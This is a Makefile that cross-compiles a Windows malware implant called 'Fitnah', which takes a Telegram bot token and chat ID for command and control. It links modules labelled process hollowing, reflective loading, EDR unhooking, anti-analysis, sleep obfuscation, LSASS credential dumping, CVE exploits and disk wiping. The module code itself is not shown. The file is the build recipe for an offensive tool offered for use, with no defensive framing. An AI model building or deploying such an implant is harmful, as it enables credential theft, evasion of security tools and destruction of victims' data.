# Fitnah implant Makefile
# Requires: mingw-w64 (apt install mingw-w64)
#           nasm       (apt install nasm)        — for asm/syscalls.asm
#
# Usage:
#   make TOKEN="123:ABC" CHAT_ID="-100999" AGENT_ID="agent-001"
#   make TOKEN="..." CHAT_ID="..." AGENT_ID="..." ARCH=x86
#   make clean

# ── Toolchain ─────────────────────────────────────────────────────────────────
ARCH       ?= x64
ifeq ($(ARCH),x86)
  CC       = i686-w64-mingw32-gcc
  AS       = nasm -f win32
  SUFFIX   = _x86
else
  CC       = x86_64-w64-mingw32-gcc
  AS       = nasm -f win64
  SUFFIX   = _x64
endif

# ── Agent config (required) ───────────────────────────────────────────────────
TOKEN      ?= YOUR_BOT_TOKEN
CHAT_ID    ?= YOUR_CHAT_ID
AGENT_ID   ?= agent-001
SLEEP      ?= 5
JITTER     ?= 20

# ── Output ────────────────────────────────────────────────────────────────────
OUTDIR     = ../build
TARGET     = $(OUTDIR)/fitnah$(SUFFIX).exe
ASM_OBJ    = $(OUTDIR)/syscalls.obj

# ── Sources ───────────────────────────────────────────────────────────────────

# Core implant
SRCS_CORE = fitnah_implant.c \
            src/utils.c      \
            src/http.c       \
            src/crypto.c     \
            src/bypass.c     \
            src/commands.c

# Syscall layer (assembled from NASM)
ASM_SRC   = ../fitnah/implant/asm/syscalls.asm

# Injection / loading
SRCS_INJECT = ../fitnah/implant/syscall/direct_syscall.c   \
              ../fitnah/implant/injection/rdi_loader.c      \
              ../fitnah/implant/injection/code_cave.c       \
              ../fitnah/implant/injection/process_mirror.c  \
              ../fitnah/implant/process_hollowing.c         \
              ../fitnah/implant/reflective_loader.c

# Evasion
SRCS_EVASION = ../fitnah/implant/evasion/memory_patcher.c      \
               ../fitnah/implant/evasion/unhook.c               \
               ../fitnah/implant/evasion/anti_analysis.c        \
               ../fitnah/implant/evasion/sleep_obfuscation.c

# Collection / exploitation
SRCS_OPS  = ../fitnah/implant/collection/lsass_dump.c \
            ../fitnah/implant/exploits/cve_exploits.c

# Impact
SRCS_IMPACT = ../fitnah/implant/impact/artifact_wipe.c \
              ../fitnah/implant/impact/disk_wipe.c

SRCS = $(SRCS_CORE) $(SRCS_INJECT) $(SRCS_EVASION) $(SRCS_OPS) $(SRCS_IMPACT)

# ── Compiler flags ────────────────────────────────────────────────────────────
INCLUDES = -Isrc \
           -I../fitnah/implant \
           -I../fitnah/implant/evasion \
           -I../fitnah/implant/injection \
           -I../fitnah/implant/collection \
           -I../fitnah/implant/exploits \
           -I../fitnah/implant/impact \
           -I../fitnah/implant/syscall

DEFINES  = -DFITNAH_BOT_TOKEN=$(TOKEN)   \
           -DFITNAH_CHAT_ID=$(CHAT_ID)   \
           -DFITNAH_AGENT_ID=$(AGENT_ID) \
           -DFITNAH_SLEEP=$(SLEEP)       \
           -DFITNAH_JITTER=$(JITTER)

CFLAGS   = -O2 -s -mwindows -static \
           -Wall -Wno-unused-function \
           -Wno-unused-variable

LDFLAGS  = -lwininet -lbcrypt -lntdll -lgdi32 -luser32 -ladvapi32 \
           -lole32 -loleaut32 -lpsapi -ldbghelp

# ── Targets ───────────────────────────────────────────────────────────────────
.PHONY: all clean

all: $(OUTDIR) $(ASM_OBJ)
	$(CC) $(SRCS) $(ASM_OBJ) $(INCLUDES) $(DEFINES) $(CFLAGS) $(LDFLAGS) -o $(TARGET)
	@echo "[+] Built: $(TARGET)"

$(ASM_OBJ): $(ASM_SRC) | $(OUTDIR)
	$(AS) $(ASM_SRC) -o $(ASM_OBJ)

$(OUTDIR):
	mkdir -p $(OUTDIR)

clean:
	rm -f $(OUTDIR)/fitnah*.exe $(OUTDIR)/fitnah*.bin $(OUTDIR)/syscalls.obj
